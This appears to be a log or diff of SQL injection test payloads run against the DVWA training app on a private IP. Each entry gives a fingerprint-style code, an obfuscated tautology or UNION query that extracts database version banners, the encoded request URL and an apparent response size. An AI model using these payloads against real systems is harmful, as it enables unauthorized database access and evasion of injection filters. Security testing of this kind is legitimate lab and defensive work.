@@ -1,0 +1,481 @@
+1&1UE: select * from users where id=11||1 union select 1,banner from v$version where rownum=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1%261UE%3A%20select%20%2A%20from%20users%20where%20id%3D11%7C%7C1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201&Submit=Submit
+	4641
+
+1&1c: select * from users where id=1 +1 or 1=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1%261c%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B1%20or%201%3D1%20--%201&Submit=Submit
+	4594
+
+1)&1c: select * from users where id=1 +(1) or 1=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1%29%261c%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%281%29%20or%201%3D1%20--%201&Submit=Submit
+	4597
+
+1)UE1: select * from users where id=1 +(1) union select 1,banner from v$version where rownum=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1%29UE1%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%281%29%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201&Submit=Submit
+	4642
+
+1)UEv: select * from users where id=1 +(1) union select null,banner from v$version where rownum=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1%29UEv%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%281%29%20union%20select%20null%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201&Submit=Submit
+	4645
+
+1UE1k: select * from users where id=1 +1 union select 1,banner from v$version where rownum=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1UE1k%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201&Submit=Submit
+	4640
+
+1UEvk: select * from users where id=1 +1 union select null,banner from v$version where rownum=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1UEvk%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B1%20union%20select%20null%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201&Submit=Submit
+	4643
+
+1c: select * from users where id=11<1# union select 1,version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1c%3A%20select%20%2A%20from%20users%20where%20id%3D11%3C1%23%20union%20select%201%2Cversion%28%29%20--%201&Submit=Submit
+	4611
+
+1o)&1: select * from users where id=1 + (\+) or 1=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1o%29%261%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%28%5C%2B%29%20or%201%3D1%20--%201&Submit=Submit
+	4599
+
+1o)UE: select * from users where id=1 + (\+) union select null,@@VERSION -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1o%29UE%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%28%5C%2B%29%20union%20select%20null%2C%40%40VERSION%20--%201&Submit=Submit
+	4620
+
+1o.UE: select * from users where id=1 +\+. union select null,@@VERSION -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1o.UE%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%5C%2B.%20union%20select%20null%2C%40%40VERSION%20--%201&Submit=Submit
+	4618
+
+1oUE1: select * from users where id=1 -1<@ union select 1,version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oUE1%3A%20select%20%2A%20from%20users%20where%20id%3D1%20-1%3C%40%20union%20select%201%2Cversion%28%29%20--%201&Submit=Submit
+	4615
+
+1oUEf: select * from users where id=1 +1<@ union select version(),version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oUEf%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B1%3C%40%20union%20select%20version%28%29%2Cversion%28%29%20--%201&Submit=Submit
+	4623
+
+1oUEv: select * from users where id=1 +1<@ union select null,version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oUEv%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B1%3C%40%20union%20select%20null%2Cversion%28%29%20--%201&Submit=Submit
+	4618
+
+1oo&1: select * from users where id=1 + \+%\ or 1=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oo%261%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%5C%2B%25%5C%20or%201%3D1%20--%201&Submit=Submit
+	4599
+
+1oo1&: select * from users where id=1 + \+%1 or 1=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oo1%26%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%5C%2B%251%20or%201%3D1%20--%201&Submit=Submit
+	4599
+
+1oo1U: select * from users where id=1 + \+%1 union select null,@@VERSION -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oo1U%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%5C%2B%251%20union%20select%20null%2C%40%40VERSION%20--%201&Submit=Submit
+	4620
+
+1ooUE: select * from users where id=1 + \+*\ union select null,@@VERSION -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1ooUE%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%5C%2B%2A%5C%20union%20select%20null%2C%40%40VERSION%20--%201&Submit=Submit
+	4620
+
+1oon&: select * from users where id=1 + \+%$ or 1=1 -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oon%26%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%5C%2B%25%24%20or%201%3D1%20--%201&Submit=Submit
+	4599
+
+1oonU: select * from users where id=1 + \+*$ union select null,@@VERSION -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=1oonU%3A%20select%20%2A%20from%20users%20where%20id%3D1%20%2B%20%5C%2B%2A%24%20union%20select%20null%2C%40%40VERSION%20--%201&Submit=Submit
+	4620
+
+s&&o1: select * from users where id='1' or ||/1=1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26%26o1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%7C%7C/1%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	201
+
+s&()o: select * from users where id='1' or (\)=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26%28%29o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%28%5C%29%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	200
+
+s&(.): select * from users where id='1' or (\.)=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26%28.%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%28%5C.%29%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	201
+
+s&(1): select * from users where id='1' or (1)=1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26%281%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%281%29%3D1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	227
+
+s&.o&: select * from users where id='1' or \.<\ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26.o%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%5C%20or%201%3D1%20--%201%27&Submit=Submit
+	181
+
+s&.o1: select * from users where id='1' or \.<1 union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26.o1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C1%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	199
+
+s&.oU: select * from users where id='1' or \.<\ union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26.oU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%5C%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	199
+
+s&.on: select * from users where id='1' or \.<$ union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26.on%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%24%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	199
+
+s&.oo: select * from users where id='1' or \.< =1 union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26.oo%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C.%3C%20%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	201
+
+s&1UE: select * from users where id='1' ||1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%261UE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%7C%7C1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	222
+
+s&1c: select * from users where id='1'   or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%261c%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%20%20or%201%3D1%20--%201%27&Submit=Submit
+	175
+
+s&1oo: select * from users where id='1' or 1^=1 union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%261oo%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%201%5E%3D1%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	226
+
+s&n.o: select * from users where id='1' or $ .=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26n.o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%20.%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	200
+
+s&n1&: select * from users where id='1' or $ 1=1 or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26n1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%201%3D1%20or%201%3D1%20--%201%27&Submit=Submit
+	182
+
+s&n1U: select * from users where id='1' or $ 1=1 union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26n1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%201%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	200
+
+s&no&: select * from users where id='1' or $<\ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26no%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%3C%5C%20or%201%3D1%20--%201%27&Submit=Submit
+	180
+
+s&no.: select * from users where id='1' or $<\. union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26no.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%3C%5C.%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	199
+
+s&noU: select * from users where id='1' or $<\ union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26noU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%3C%5C%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	198
+
+s&noo: select * from users where id='1' or $+<$ union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26noo%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%24%2B%3C%24%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	199
+
+s&o.&: select * from users where id='1' or \<\. or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26o.%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%5C.%20or%201%3D1%20--%201%27&Submit=Submit
+	181
+
+s&o.U: select * from users where id='1' or \<\. union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26o.U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%5C.%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	199
+
+s&o1&: select * from users where id='1' or \<1 or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26o1%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C1%20or%201%3D1%20--%201%27&Submit=Submit
+	180
+
+s&o1U: select * from users where id='1' or !<1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26o1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%21%3C1%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	198
+
+s&oUE: select * from users where id='1' or \<\ union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26oUE%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%5C%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	198
+
+s&on&: select * from users where id='1' or \<$ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26on%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%24%20or%201%3D1%20--%201%27&Submit=Submit
+	180
+
+s&onU: select * from users where id='1' or \<$ union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26onU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%24%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	198
+
+s&oo1: select * from users where id='1' or \< =1 union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26oo1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%5C%3C%20%3D1%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	200
+
+s&ov&: select * from users where id='1' or !<@ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26ov%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%21%3C%40%20or%201%3D1%20--%201%27&Submit=Submit
+	180
+
+s&ovU: select * from users where id='1' or !<@ union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26ovU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%21%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	198
+
+s&v(1: select * from users where id='1' or @(1)=1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26v%281%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%40%281%29%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	201
+
+s&v1U: select * from users where id='1' or @ 1=1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26v1U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%40%201%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	200
+
+s&vvU: select * from users where id='1' or @ @1=1 union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%26vvU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%40%20%401%3D1%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	201
+
+s(UEs: select * from users where id=1 or 1#"( union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%28UEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%28%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s,UEs: select * from users where id=1 or 1#", union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%2CUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%2C%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s.UEs: select * from users where id=1 or 1#". union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s.UEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22.%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s1UEs: select * from users where id=1 or 1#"1 union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s1UEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%221%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s: select * from users where id='1' or ""<@ union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20or%20%22%22%3C%40%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	199
+
+s:UEs: select * from users where id=1 or 1#": union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3AUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%3A%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s:s: select * from users where id='1' union select ":"_,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3As%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%3A%22_%2Cversion%28%29%20--%201%27&Submit=Submit
+	194
+
+s;UEs: select * from users where id=1 or 1#"; union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3BUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%3B%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s;s: select * from users where id='1' union select ";"_,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3Bs%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%3B%22_%2Cversion%28%29%20--%201%27&Submit=Submit
+	194
+
+s?,vc: select * from users where id='1' union select $["],@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3F%2Cvc%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%5B%22%5D%2C%40%40VERSION%20--%201%27&Submit=Submit
+	194
+
+s?UEs: select * from users where id=1 or 1#"? union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3FUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%3F%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+s?s: select * from users where id='1' union select "?"_,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=s%3Fs%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%3F%22_%2Cversion%28%29%20--%201%27&Submit=Submit
+	194
+
+sUE&o: select * from users where id='1' union select ||/1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE%26o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%7C%7C/1%2Cversion%28%29%20--%201%27&Submit=Submit
+	194
+
+sUE(): select * from users where id='1' union select (\),@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE%28%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%28%5C%29%2C%40%40VERSION%20--%201%27&Submit=Submit
+	193
+
+sUE(.: select * from users where id='1' union select (\.),@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE%28.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%28%5C.%29%2C%40%40VERSION%20--%201%27&Submit=Submit
+	194
+
+sUE(1: select * from users where id='1' union select (1),banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE%281%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%281%29%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	220
+
+sUE,v: select * from users where id='1' union select \,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE%2Cv%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C%2C%40%40VERSION%20--%201%27&Submit=Submit
+	191
+
+sUE.,: select * from users where id='1' union select \.,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE.%2C%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C.%2C%40%40VERSION%20--%201%27&Submit=Submit
+	192
+
+sUE.c: select * from users where id='1' union select \.#,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE.c%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C.%23%2C%40%40VERSION%20--%201%27&Submit=Submit
+	193
+
+sUE.o: select * from users where id='1' union select \.%1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE.o%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C.%251%2C%40%40VERSION%20--%201%27&Submit=Submit
+	194
+
+sUE1k: select * from users where id='1' union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE1k%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	218
+
+sUE1n: select * from users where id='1' union select 1a,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE1n%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%201a%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	219
+
+sUE1s: select * from users where id='1' union select 1"!",banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE1s%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%201%22%21%22%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	221
+
+sUE\c: select * from users where id='1' union select \#,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUE%5Cc%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%5C%23%2C%40%40VERSION%20--%201%27&Submit=Submit
+	192
+
+sUEn.: select * from users where id='1' union select $ .,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEn.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%20.%2C%40%40VERSION%20--%201%27&Submit=Submit
+	193
+
+sUEnn: select * from users where id='1' union select $ _,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEnn%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%20_%2C%40%40VERSION%20--%201%27&Submit=Submit
+	193
+
+sUEnv: select * from users where id='1' union select $*$,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEnv%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%24%2A%24%2C%40%40VERSION%20--%201%27&Submit=Submit
+	193
+
+sUEo,: select * from users where id='1' union select +\,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEo%2C%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%2B%5C%2C%40%40VERSION%20--%201%27&Submit=Submit
+	192
+
+sUEo.: select * from users where id='1' union select +\.,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEo.%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%2B%5C.%2C%40%40VERSION%20--%201%27&Submit=Submit
+	193
+
+sUEo1: select * from users where id='1' union select !<1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEo1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%21%3C1%2Cversion%28%29%20--%201%27&Submit=Submit
+	193
+
+sUEo\: select * from users where id='1' union select +\#,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEo%5C%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%2B%5C%23%2C%40%40VERSION%20--%201%27&Submit=Submit
+	193
+
+sUEov: select * from users where id='1' union select !<@,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEov%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%21%3C%40%2Cversion%28%29%20--%201%27&Submit=Submit
+	193
+
+sUEv1: select * from users where id='1' union select @ 1,version() --  1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEv1%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%40%201%2Cversion%28%29%20--%20%201%27&Submit=Submit
+	194
+
+sUEvk: select * from users where id='1'   union select null,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEvk%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%20%20union%20select%20null%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	223
+
+sUEvv: select * from users where id='1' union select @ @1,version() --  1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sUEvv%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%40%20%401%2Cversion%28%29%20--%20%201%27&Submit=Submit
+	195
+
+sn: select * from users where id='1' union select "["_,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=sn%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20union%20select%20%22%5B%22_%2Cversion%28%29%20--%201%27&Submit=Submit
+	194
+
+snUEs: select * from users where id=1 or 1#"$ union select 'a',version() -- 1
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=snUEs%3A%20select%20%2A%20from%20users%20where%20id%3D1%20or%201%23%22%24%20union%20select%20%27a%27%2Cversion%28%29%20--%201&Submit=Submit
+	175
+
+so()&: select * from users where id='1' *(\) or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so%28%29%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%28%5C%29%20or%201%3D1%20--%201%27&Submit=Submit
+	178
+
+so()U: select * from users where id='1' + (\) union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so%28%29U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%28%5C%29%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	197
+
+so(.): select * from users where id='1' + (\.) union select 1,@@VERSION -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so%28.%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2B%20%28%5C.%29%20union%20select%201%2C%40%40VERSION%20--%201%27&Submit=Submit
+	198
+
+so(1): select * from users where id='1' *(1) union select 1,banner from v$version where rownum=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so%281%29%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%2A%281%29%20union%20select%201%2Cbanner%20from%20v%24version%20where%20rownum%3D1%20--%201%27&Submit=Submit
+	223
+
+so..&: select * from users where id='1'<@.. or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so..%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%3C%40..%20or%201%3D1%20--%201%27&Submit=Submit
+	177
+
+so..U: select * from users where id='1'<@.. union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so..U%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%3C%40..%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	195
+
+so.n&: select * from users where id='1' <@.$ or 1=1 -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so.n%26%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40.%24%20or%201%3D1%20--%201%27&Submit=Submit
+	178
+
+so.nU: select * from users where id='1' <@._ union select 1,version() -- 1'
+	http://10.147.38.44/DVWA/vulnerabilities/sqli/?id=so.nU%3A%20select%20%2A%20from%20users%20where%20id%3D%271%27%20%3C%40._%20union%20select%201%2Cversion%28%29%20--%201%27&Submit=Submit
+	196
+
